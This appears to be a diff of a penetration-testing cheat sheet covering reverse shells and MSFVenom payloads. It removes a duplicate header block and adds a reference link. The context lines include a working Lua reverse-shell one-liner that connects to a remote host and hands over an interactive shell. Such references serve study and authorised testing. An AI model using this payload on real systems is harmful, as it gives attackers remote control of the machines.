@@ -184,11 +184,6 @@ Linux only
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 ```
 
-# MSFVenom Cheatsheet
-Single Page Cheatsheet for common MSF Venom One Liners  
-Available in PDF, DOCX and Markdown format!
-*PDF and DOCX versions contain the payload size in bytes and a few more commands.*
-
 
 # MSFVenom Cheatsheet
 
@@ -239,4 +234,5 @@ The -j option is to keep all the connected session in the background.
 https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675  
 https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/  
 http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/  
+https://github.com/frizb/MSF-Venom-Cheatsheet/edit/master/README.md
 
